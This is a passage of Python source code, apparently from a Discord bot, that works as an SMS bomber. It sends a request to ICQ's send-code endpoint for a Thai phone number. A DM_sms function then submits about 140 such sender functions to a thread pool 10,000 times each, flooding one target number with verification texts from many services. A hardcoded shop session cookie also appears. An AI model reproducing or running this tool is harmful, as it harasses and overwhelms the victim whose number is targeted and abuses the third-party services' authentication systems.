            "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
            "Cookie":
            "PHPSESSID=2i484jdb1pie5am071cveupme5; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; form_key=rUt4Q17TiRlUfgKz; _ga=GA1.2.1486915122.1646803642; _gid=GA1.2.1348564830.1646803642; _fbp=fb.1.1646803643605.1538052508; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; smartbanner_exited=1; __atuvc=2%7C10; __atuvs=62283aaa77850300001; _gat=1; private_content_version=382c8a313cac3cd587475c1b3693672e; section_data_ids=%7B%22cart%22%3A1646803701%2C%22customer%22%3A1646803701%2C%22compare-products%22%3A1646803701%2C%22last-ordered-items%22%3A1646803701%2C%22directory-data%22%3A1646803701%2C%22captcha%22%3A1646803701%2C%22instant-purchase%22%3A1646803701%2C%22persistent%22%3A1646803701%2C%22review%22%3A1646803701%2C%22wishlist%22%3A1646803701%2C%22chatData%22%3A1646803701%2C%22recently_viewed_product%22%3A1646803701%2C%22recently_compared_product%22%3A1646803701%2C%22product_data_storage%22%3A1646803701%2C%22paypal-billing-agreement%22%3A1646803701%2C%22messages%22%3A1646803708%7D"
        })


def api107(phone):
    post("https://u.icq.net/api/v65/rapi/auth/sendCode",
         headers={"User-Agent": useragent},
         json={
             "reqId": "39816-1633012470",
             "params": {
                 "phone": f"+66{phone[1:]}",
                 "language": "en-US",
                 "route": "sms",
                 "devId": "ic1rtwz1s1Hj1O0r",
                 "application": "icq"
             }
         })

def DM_sms(phone):
    for x in range(10000):
        threading.submit(sk1, phone)
        threading.submit(sk2, phone)
        threading.submit(sk3, phone)
        threading.submit(sk4, phone)
        threading.submit(sk5, phone)
        threading.submit(sk6, phone)
        threading.submit(sk7, phone)
        threading.submit(sk8, phone)
        threading.submit(sk9, phone)
        threading.submit(sk10, phone)
        threading.submit(sk11, phone)
        threading.submit(sk12, phone)
        threading.submit(sk13, phone)
        threading.submit(sk14, phone)
        threading.submit(sk15, phone)
        threading.submit(sk16, phone)
        threading.submit(sk17, phone)
        threading.submit(sk18, phone)
        threading.submit(sk19, phone)
        threading.submit(sk20, phone)
        threading.submit(sk21, phone)
        threading.submit(sk22, phone)
        threading.submit(sk23, phone)
        threading.submit(sk24, phone)
        threading.submit(sk25, phone)
        threading.submit(sk26, phone)
        threading.submit(sk27, phone)
        threading.submit(sk28, phone)
        threading.submit(sk29, phone)
        threading.submit(sk30, phone)
        threading.submit(sk31, phone)
        threading.submit(sk32, phone)
        threading.submit(p1112v2, phone)
        threading.submit(yandex, phone)
        threading.submit(p1112, phone)
        threading.submit(okru, phone)
        threading.submit(karusel, phone)
        threading.submit(icq, phone)
        threading.submit(findclone, phone)
        threading.submit(spam_pizza, phone)
        threading.submit(youla, phone)
        threading.submit(instagram, phone)
        threading.submit(VBC, phone)
        threading.submit(api1, phone)
        threading.submit(api2, phone)
        threading.submit(api3, phone)
        threading.submit(api4, phone)
        threading.submit(api5, phone)
        threading.submit(api6, phone)
        threading.submit(api7, phone)
        threading.submit(api8, phone)
        threading.submit(api9, phone)
        threading.submit(api10, phone)
        threading.submit(api11, phone)
        threading.submit(api12, phone)
        threading.submit(api13, phone)
        threading.submit(api14, phone)
        threading.submit(api15, phone)
        threading.submit(api16, phone)
        threading.submit(api17, phone)
        threading.submit(api18, phone)
        threading.submit(api19, phone)
        threading.submit(api22, phone)
        threading.submit(api21, phone)
        threading.submit(api23, phone)
        threading.submit(api24, phone)
        threading.submit(api25, phone)
        threading.submit(api26, phone)
        threading.submit(api27, phone)
        threading.submit(api28, phone)
        threading.submit(api29, phone)
        threading.submit(api30, phone)
        threading.submit(api31, phone)
        threading.submit(api32, phone)
        threading.submit(api33, phone)
        threading.submit(api34, phone)
        threading.submit(api35, phone)
        threading.submit(api36, phone)
        threading.submit(api37, phone)
        threading.submit(api38, phone)
        threading.submit(api39, phone)
        threading.submit(api40, phone)
        threading.submit(api41, phone)
        threading.submit(api42, phone)
        threading.submit(api43, phone)
        threading.submit(api44, phone)
        threading.submit(api45, phone)
        threading.submit(api46, phone)
        threading.submit(api47, phone)
        threading.submit(api48, phone)
        threading.submit(api49, phone)
        threading.submit(api50, phone)
        threading.submit(api51, phone)
        threading.submit(api52, phone)
        threading.submit(api53, phone)
        threading.submit(api54, phone)
        threading.submit(api55, phone)
        threading.submit(api56, phone)
        threading.submit(api57, phone)
        threading.submit(api58, phone)
        threading.submit(api59, phone)
        threading.submit(api60, phone)
        threading.submit(api61, phone)
        threading.submit(api62, phone)
        threading.submit(api63, phone)
        threading.submit(api64, phone)
        threading.submit(api65, phone)
        threading.submit(api66, phone)
        threading.submit(api67, phone)
        threading.submit(api68, phone)
        threading.submit(api69, phone)
        threading.submit(api70, phone)
        threading.submit(api71, phone)
        threading.submit(api72, phone)
        threading.submit(api73, phone)
        threading.submit(api74, phone)
        threading.submit(api75, phone)
        threading.submit(api76, phone)
        threading.submit(api77, phone)
        threading.submit(api79, phone)
        threading.submit(api80, phone)
        threading.submit(api88, phone)
        threading.submit(api89, phone)
        threading.submit(api90, phone)
        threading.submit(api91, phone)
        threading.submit(api92, phone)
        threading.submit(api93, phone)
        threading.submit(api94, phone)
        threading.submit(api95, phone)
        threading.submit(api96, phone)
        threading.submit(api97, phone)
        threading.submit(api98, phone)
        threading.submit(api99, phone)
        threading.submit(api100, phone)
        threading.submit(api101, phone)
        threading.submit(api102, phone)
        threading.submit(api103, phone)
        threading.submit(api104, phone)
        threading.submit(api105, phone)
        threading.submit(api106, phone)
        threading.submit(api107, phone)



bot.start()

## © All Code & Ui By 𝙈𝙚𝙤𝙖𝙬 メ#9999 | โค้ดนี้ผมทำเองทั้งหมด ได้รับความช่วยเหลือจาก Dev โมดูล interactions.py
